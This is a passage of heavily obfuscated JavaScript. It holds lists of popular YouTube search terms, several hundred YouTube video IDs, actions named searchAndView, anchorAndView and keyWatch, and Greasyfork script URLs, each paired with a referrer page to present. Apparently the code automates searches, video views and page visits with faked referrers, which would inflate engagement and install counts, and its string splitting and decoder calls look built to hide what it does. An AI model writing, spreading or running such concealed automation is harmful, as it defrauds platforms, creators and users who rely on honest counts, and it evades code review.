'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + T(0x2) + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + U(0xa, 'zc@G') + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xd31 + -0x645 + 0x1380)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x23 * 0x9 + -0x57e * 0x6 + 0x1 * 0x2239)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * 0x1d14 + -0x16b1 + 0x2 * -0x330);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    V(0xb) + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    U(0xd, 'IoOi') + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + V(0x5) + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x10, 'xZ[i') + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x8) + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': U(0xf, 'xZ[i') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x5) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
